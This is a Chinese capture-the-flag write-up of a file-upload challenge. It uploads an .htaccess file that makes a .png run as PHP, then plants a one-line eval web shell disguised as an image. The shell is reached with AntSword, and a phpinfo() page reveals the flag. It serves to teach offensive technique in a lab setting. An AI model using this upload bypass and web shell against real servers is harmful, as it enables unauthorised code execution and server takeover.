# Week5 Give me your photo PLZ 200

## 0、知识点与工具

>   文件上传

>   php`.htaccess`文件

>   burpsuite



## 1、分析

>   打开题目的网页，页面非常的简洁直观
>
>   页面只有一个文件上传，查看源代码也没发现什么
>
>   测试上传一些文件，可以发现`.php、phtml`等一些常规的后缀会被检测
>
>   尝试上传`.user.ini、.htaccess`文件，发现`.haccess`可以上传成功

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221214143257.png)

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221214143737.png)

## 2、解题

>   由于可以上传成功`.htaccess`文件,所以`.htaccess`文件内容如下

```php
<FilesMatch "1xin.png">
SetHandler application/x-httpd-php
</FilesMatch>
```

>   然后准备一个名称为`1xin.png`的图片，内容如下，然后上传

```php
<?php
@eval($_POST['shell']);
?>
```

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221214144100.png)

>   上传成功，然后访问这个图片，图片路径为`/upload/1xin.png`
>
>   虽然没有输出东西，但是图片中的php代码已经执行

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202212141442966.png)

>   然后打开蚁剑连接php后门

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221214144426.png)

>   然后右键文件管理，进如到网站根目录，可以找到一个`flag`文件 ，然后打开

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/20221214144556.png)

>   这里告诉我们flag是在env环境中

>   修改`.htaccess`文件重新上传图片，新建一个`2xin.png`内容为显示环境

```php
<FilesMatch "2xin.png">
SetHandler application/x-httpd-php
</FilesMatch>
```

```php
<?php
phpinfo();
?>
```

>   上传成功后访问图片路径，在`Environment`中找到`flag`

![](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/202212141450743.png)

